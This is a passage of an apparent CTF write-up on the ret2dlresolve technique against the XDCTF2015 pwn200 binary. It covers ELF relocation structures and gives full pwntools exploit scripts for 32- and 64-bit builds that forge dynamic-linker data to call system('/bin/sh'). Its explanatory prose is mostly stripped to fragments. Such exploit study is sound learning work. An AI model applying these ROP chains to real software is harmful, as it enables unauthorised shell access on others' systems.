c"><table><tr><td class="code"><pre><span class="line">readelf -S main_no_relro_32</span><br><span class="line">[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al </span><br><span class="line">[<span class="number">21</span>] .dynamic          DYNAMIC         <span class="number">080497</span>c4 <span class="number">0007</span>c4 <span class="number">0000e8</span> <span class="number">08</span>  WA  <span class="number">6</span>   <span class="number">0</span>  <span class="number">4</span></span><br></pre></td></tr></table></figure><p><img src="/2023/07/09/ret2dlresolve/image-20230708122318087.png" alt="image-20230708122318087"></p></blockquote><p>readsystemdynstrreadgot(jmp *got)_dl_runtime_resolveplt</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="meta"># context.log_level=<span class="string">&quot;debug&quot;</span></span></span><br><span class="line">context.arch=<span class="string">&quot;i386&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">rop = ROP(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">p.recvuntil(b<span class="number">&#x27;</span>Welcome to XDCTF2015~!\n<span class="number">&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x08048376&#x27;</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">rop.raw(offset*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>)</span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x08049804</span>+<span class="number">4</span>,<span class="number">4</span>) <span class="meta"># modify .dynstr pointer in .dynamic section to a specific location</span></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()<span class="meta">#get the data of .dynstr section </span></span><br><span class="line">print(b<span class="number">&#x27;</span>*<span class="string">&#x27;*10)</span></span><br><span class="line"><span class="string">print(dynstr)</span></span><br><span class="line"><span class="string">dynstr = dynstr.replace(b&quot;read&quot;,b&quot;system&quot;)#replace the section data </span></span><br><span class="line"><span class="string">print(b&#x27;</span>*<span class="string">&#x27;*10)</span></span><br><span class="line"><span class="string">print(dynstr)</span></span><br><span class="line"><span class="string">rop.read(0,0x080498E0,len((dynstr))) # construct a fake dynstr section</span></span><br><span class="line"><span class="string">rop.read(0,0x080498E0+0x100,len(b&quot;/bin/sh\x00&quot;)) # read /bin/sh\x00</span></span><br><span class="line"><span class="string">rop.raw(0x08048376) # the second instruction of read@plt </span></span><br><span class="line"><span class="string">rop.raw(0xdeadbeef)</span></span><br><span class="line"><span class="string">rop.raw(0x080498E0+0x100)</span></span><br><span class="line"><span class="string"># print(rop.dump())</span></span><br><span class="line"><span class="string">assert(len(rop.chain())&lt;=256)</span></span><br><span class="line"><span class="string">rop.raw(&quot;a&quot;*(256-len(rop.chain())))</span></span><br><span class="line"><span class="string">p.send(rop.chain())</span></span><br><span class="line"><span class="string">p.send(p32(0x080498E0))</span></span><br><span class="line"><span class="string">p.send(dynstr)</span></span><br><span class="line"><span class="string"># p.send(&quot;/bin/sh\x00&quot;)</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br></pre></td></tr></table></figure><h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/c/p/s/x/r/<span class="number">2</span>/<span class="number">3</span>/partial-relro&gt; checksec main_partial_relro_32</span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/share/ctfwiki/pwn/stack_overflow/x86/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure><p>.dynamic </p><p>rop_dl_runtime_resolve(plt0)rel.pltElf32_RelElf32_Relr_info&gt;&gt;8.dynsymElf32_Sym,Elf32_Symst_namedynstr</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word    r_info;<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><p><strong>r_offset</strong></p><p>r_info 824</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word    st_name;<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">    Elf32_Addr    st_value;<span class="comment">/* Symbol value */</span></span><br><span class="line">    Elf32_Word    st_size;<span class="comment">/* Symbol size */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>    st_info;<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>    st_other;<span class="comment">/* Symbol visibility */</span></span><br><span class="line">    Elf32_Section    st_shndx;<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main_partial_relro_32&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)  </span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x804853A&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#stack mrigrate to new_stack</span></span><br><span class="line">bss_ad=elf.bss()</span><br><span class="line">new_stack=bss_ad+<span class="number">0x800</span>+<span class="built_in">int</span>((<span class="number">0x80487c4</span>-<span class="number">0x080487A8</span>)/<span class="number">2</span>)*<span class="number">0x10</span></span><br><span class="line">p(<span class="string">&#x27;new_stack&#x27;</span>,new_stack)</span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span></span><br><span class="line">rop.raw(padding)</span><br><span class="line">rop.read(<span class="number">0</span>,new_stack,<span class="number">100</span>)</span><br><span class="line">rop.migrate(new_stack)</span><br><span class="line">sl(rop.chain())</span><br><span class="line"></span><br><span class="line"><span class="comment">#new_stack rop data</span></span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="comment">#get the .plt address</span></span><br><span class="line">plt0=elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">p(<span class="string">&#x27;dynsym&#x27;</span>,dynsym)</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">p(<span class="string">&#x27;dynstr&#x27;</span>,dynstr)</span><br><span class="line">p(<span class="string">&#x27;plt&#x27;</span>,plt0)</span><br><span class="line"><span class="comment"># get the data of .rel.plt</span></span><br><span class="line">rel_plt_ad=elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">p(<span class="string">&quot;rel_plt_ad&quot;</span>,rel_plt_ad)</span><br><span class="line">rel_plt_data=elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).data()</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="comment">#write_relplt_offset is the seonde parameter of _dl_runtime_resolve</span></span><br><span class="line">write_relplt_offset=rel_plt_data.find(p32(write_got))</span><br><span class="line">p(<span class="string">&#x27;write_relplt_offset&#x27;</span>,write_relplt_offset)</span><br><span class="line"><span class="comment">#30Elf32_Rel</span></span><br><span class="line">fake_write_relplt_offset=new_stack+<span class="number">30</span>-rel_plt_ad</span><br><span class="line"><span class="comment">#40Elf32_SymElf32_Sym1616align</span></span><br><span class="line">fake_sym_addr=new_stack+<span class="number">40</span></span><br><span class="line">align=<span class="number">0x10</span>-(fake_sym_addr-dynsym)&amp;<span class="number">0xf</span></span><br><span class="line"><span class="comment">#next rop the padding should be 40+align</span></span><br><span class="line">fake_sym_addr=fake_sym_addr+align</span><br><span class="line"><span class="comment">#Elf32_Symdynsym</span></span><br><span class="line">index_dynsym=<span class="built_in">int</span>((fake_sym_addr-dynsym)/<span class="number">16</span>)</span><br><span class="line"><span class="comment">#248</span></span><br><span class="line">r_info=(index_dynsym&lt;&lt;<span class="number">8</span>)|<span class="number">7</span></span><br><span class="line">fake_write_reloc=flat([write_got,r_info])</span><br><span class="line">gnu_version_addr = elf.get_section_by_name(<span class="string">&#x27;.gnu.version&#x27;</span>).header.sh_addr</span><br><span class="line"><span class="comment">#70system</span></span><br><span class="line">fake_write_str_ad=new_stack+<span class="number">70</span></span><br><span class="line"><span class="comment">#Elf32_Sym.st_namedynstr</span></span><br><span class="line">write_str_offset=fake_write_str_ad-dynstr</span><br><span class="line">fake_write_sym = flat([write_str_offset, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ndx_addr: %s&quot;</span> % <span class="built_in">hex</span>(gnu_version_addr+index_dynsym*<span class="number">2</span>))</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(fake_write_relplt_offset)</span><br><span class="line"><span class="comment"># fake ret of write</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line"><span class="comment">#parameter of system</span></span><br><span class="line">rop.raw(new_stack + <span class="number">80</span>)</span><br><span class="line">sh = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">write_str=<span class="string">b&#x27;system\x00&#x27;</span></span><br><span class="line"><span class="comment"># print(len(rop.chain()))</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">30</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line"><span class="comment">#fake_write_reloc</span></span><br><span class="line">rop.raw(fake_write_reloc)</span><br><span class="line"><span class="comment"># rop.raw(rel_plt_data[write_relplt_offset:write_relplt_offset+8])</span></span><br><span class="line"><span class="comment"># print(rel_plt_data[write_relplt_offset:write_relplt_offset+8])</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">40</span>+align-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(fake_write_sym)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">70</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(write_str)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line"><span class="comment"># print(rop.dump())</span></span><br><span class="line"><span class="comment"># sleep(2)</span></span><br><span class="line">sl(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>rop.migrate(new_stack)</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">pop ebp; retgadget</span><br><span class="line">new_stack-size_t</span><br><span class="line">leave; retgadget</span><br></pre></td></tr></table></figure><p>rspnew_stackretnew_stackrop</p></blockquote><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./main_partial_relro_32&quot;</span>)</span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line">rop.read(<span class="number">0</span>,dlresolve.data_addr,<span class="number">0x100</span>)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line">print(rop.dump())</span><br><span class="line">io = process(<span class="string">&quot;./main_partial_relro_32&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *0x804853A&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>)</span><br><span class="line">padding=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload=padding+raw_rop</span><br><span class="line">io.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(dlresolve.payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>dlresolve.data_addrELFdyn sys strbss </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>],data_addr=)</span><br></pre></td></tr></table></figure><p>print(rop.dump())</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[*] Loaded <span class="number">10</span> cached gadgets <span class="keyword">for</span> <span class="string">&#x27;./main_partial_relro_32&#x27;</span></span><br><span class="line"><span class="number">0x0000</span>:        <span class="number">0x8048390</span> read(<span class="number">0</span>, <span class="number">0x804ae00</span>, <span class="number">0x400</span>)</span><br><span class="line"><span class="number">0x0004</span>:        <span class="number">0x804836a</span> &lt;adjust @<span class="number">0x14</span>&gt; add esp, <span class="number">8</span>; pop ebx; ret</span><br><span class="line"><span class="number">0x0008</span>:              <span class="number">0x0</span> arg0</span><br><span class="line"><span class="number">0x000c</span>:        <span class="number">0x804ae00</span> arg1</span><br><span class="line"><span class="number">0x0010</span>:            <span class="number">0x400</span> arg2</span><br><span class="line"><span class="number">0x0014</span>:        <span class="number">0x8048370</span> [plt_init] system(<span class="number">0x804ae24</span>)</span><br><span class="line"><span class="number">0x0018</span>:           <span class="number">0x2af8</span> [dlresolve index]</span><br><span class="line"><span class="number">0x001c</span>:          b<span class="number">&#x27;</span>haaa<span class="number">&#x27;</span> &lt;system <span class="keyword">return</span> address&gt;</span><br><span class="line"><span class="number">0x0020</span>:        <span class="number">0x804ae24</span> system arg0</span><br></pre></td></tr></table></figure><h2 id="64"><a href="#64" class="headerlink" title="64"></a>64</h2><h3 id="NO-RELRO-1"><a href="#NO-RELRO-1" class="headerlink" title="NO-RELRO"></a>NO-RELRO</h3><p>ret2csurdx</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000400750</span> <span class="number">4</span>C <span class="number">89</span> FA                      mov     rdx, r15</span><br><span class="line">.text:<span class="number">0000000000400753</span> <span class="number">4</span>C <span class="number">89</span> F6                      mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400756</span> <span class="number">44</span> <span class="number">89</span> EF                      mov     edi, r13d</span><br><span class="line">.text:<span class="number">0000000000400759</span> <span class="number">41</span> FF <span class="number">14</span> DC                   call    ds:(__frame_dummy_init_array_entry - <span class="number">6008F</span>8h)[r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">0000000000400759</span></span><br><span class="line">.text:<span class="number">000000000040075</span>D <span class="number">48</span> <span class="number">83</span> C3 <span class="number">01</span>                   add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400761</span> <span class="number">48</span> <span class="number">39</span> DD                      cmp     rbp, rbx</span><br><span class="line">.text:<span class="number">0000000000400764</span> <span class="number">75</span> EA                         jnz     <span class="type">short</span> loc_400750</span><br><span class="line">.text:<span class="number">0000000000400764</span></span><br><span class="line">.text:<span class="number">0000000000400766</span></span><br><span class="line">.text:<span class="number">0000000000400766</span>                               loc_400766:                             ; CODE XREF: __libc_csu_init+<span class="number">34</span>j</span><br><span class="line">.text:<span class="number">0000000000400766</span> <span class="number">48</span> <span class="number">83</span> C4 <span class="number">08</span>                   add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040076</span>A <span class="number">5B</span>                            pop     rbx</span><br><span class="line">.text:<span class="number">000000000040076B</span> <span class="number">5</span>D                            pop     rbp</span><br><span class="line">.text:<span class="number">000000000040076</span>C <span class="number">41</span> <span class="number">5</span>C                         pop     r12</span><br><span class="line">.text:<span class="number">000000000040076</span>E <span class="number">41</span> <span class="number">5</span>D                         pop     r13</span><br><span class="line">.text:<span class="number">0000000000400770</span> <span class="number">41</span> <span class="number">5</span>E                         pop     r14</span><br><span class="line">.text:<span class="number">0000000000400772</span> <span class="number">41</span> <span class="number">5F</span>                         pop     r15</span><br><span class="line">.text:<span class="number">0000000000400774</span> C3                            retn</span><br></pre></td></tr></table></figure><p>32readsystemdynstrbssdynmicdynstrbssdynstrrdibinshropreadplt_dl_runtime_resolvesystem</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main_no_relro_64&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;28808&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)  </span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">csu_front_addr = <span class="number">0x400750</span></span><br><span class="line">csu_end_addr = <span class="number">0x40076A</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2csu</span>(<span class="params">func,a1,a2,a3,return_ad</span>):</span><br><span class="line">    rbx=<span class="number">0</span></span><br><span class="line">    rbp=<span class="number">1</span></span><br><span class="line">    r12=func</span><br><span class="line">    r13=a1</span><br><span class="line">    r14=a2</span><br><span class="line">    r15=a3</span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload+=<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>+p64(return_ad)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">    </span><br><span class="line">db(<span class="string">&#x27;b *0x040063C&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;read&quot;</span>,<span class="string">b&quot;system&quot;</span>)</span><br><span class="line"><span class="comment">#stack mrigrate to new_stack</span></span><br><span class="line">bss_ad=elf.bss()+<span class="number">0x200</span></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">start=elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">120</span></span><br><span class="line">rop.raw(padding)</span><br><span class="line">rop.raw(ret2csu(read_got,<span class="number">0</span>,bss_ad,<span class="built_in">len</span>(dynstr+<span class="string">b&#x27;\x00/bin/sh\x00&#x27;</span>),start))</span><br><span class="line">s(rop.chain().ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">s(dynstr+<span class="string">b&#x27;\x00/bin/sh\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">dynmic_dynstr=<span class="number">0x600988</span>+<span class="number">8</span></span><br><span class="line">poprdi=<span class="number">0x0400773</span></span><br><span class="line">payload=padding+ret2csu(read_got,<span class="number">0</span>,dynmic_dynstr,<span class="number">8</span>,start)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">s(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">s(p64(bss_ad))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">read_plt=<span class="number">0x400516</span></span><br><span class="line">padding=<span class="string">b&#x27;d&#x27;</span>*<span class="number">120</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">ret=<span class="number">0x00000000004004c6</span></span><br><span class="line">payload=padding+p64(poprdi)+p64(bss_ad+<span class="built_in">len</span>(dynstr)+<span class="number">1</span>)+p64(ret)+p64(read_plt)</span><br><span class="line">s(payload)</span><br><span class="line"><span class="comment"># # b()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="Partial-RELRO-1"><a href="#Partial-RELRO-1" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><p>32 64 plt  push </p><p><img src="/2023/07/09/ret2dlresolve/image-20230724174219575.png" alt="image-20230724174219575"></p><p>Versym: 0x4003f6 version index addr</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// , dl_fixup </span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX(DT_VERSYM)] != <span class="literal">NULL</span>)<span class="comment">//llink_map</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum = (<span class="type">const</span> <span class="type">void</span> *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line"><span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> &#123;</span></span><br><span class="line">    Elf64_Addr l_addr;</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *l_name;</span><br><span class="line"> </span><br><span class="line">    Elf64_Dyn *l_ld;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_prev</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"> </span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line"> </span><br><span class="line">    Elf64_Dyn *l_info[<span class="number">76</span>];  <span class="comment">//l_info </span></span><br><span class="line">    ...</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> l_tls_firstbyte_offset;</span><br><span class="line"> </span><br><span class="line">    <span class="type">ptrdiff_t</span> l_tls_offset;</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> l_tls_modid;</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> l_tls_dtor_count;</span><br><span class="line"> </span><br><span class="line">    Elf64_Addr l_relro_addr;</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> l_relro_size;</span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> l_serial;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">auditstate</span> <span class="title">l_audit</span>[];</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>linkmapl_info[VERSYMIDX(DT_VERSYM)]0</p><p>linkmapgotl_info[VERSYMIDX(DT_VERSYM)]linkmap0x1c8</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main_partial_relro_64&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;28808&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span 